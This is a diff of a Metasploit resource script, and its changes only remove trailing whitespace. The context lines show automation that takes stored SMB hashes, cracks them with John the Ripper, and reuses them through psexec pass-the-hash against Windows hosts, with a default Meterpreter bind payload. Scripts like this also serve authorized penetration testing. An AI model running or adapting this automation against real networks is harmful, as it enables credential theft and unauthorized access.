@@ -9,8 +9,8 @@
 
 <ruby>
 #psexec needs a payload
-if framework.datastore['PAYLOAD'] 
-	pload = framework.datastore['PAYLOAD'] 
+if framework.datastore['PAYLOAD']
+	pload = framework.datastore['PAYLOAD']
 else	#just to get sure that we have a backup payload
 	pload = "windows/meterpreter/bind_tcp"
 end
@@ -59,7 +59,7 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 
 	if (jotr == 1)
 		# first checking weak windows hashes with john ... because of the filtering before, we are sure that
-		# this is a windows hash 
+		# this is a windows hash
 		# on the first found hash we are going to analyse all hashes - then we set jotr to 0
 
 		print_line("using jtr_crack_fast")
@@ -74,14 +74,14 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 
 	smbhash = creds.pass
 	username = creds.user
-	
+
 	framework.db.hosts.each do |host|
 		next if (host.os_name !~ /Windows/)		# pass the hash works just for Win
 
 		host.services.each do |serv|
 			next if not serv.host
 			next if (serv.state != Msf::ServiceState::Open)
-			next if (serv.name !~ /smb/) 
+			next if (serv.name !~ /smb/)
 
 			print_line("using psexec - Pass the hash")
 			if(verbose == 1)
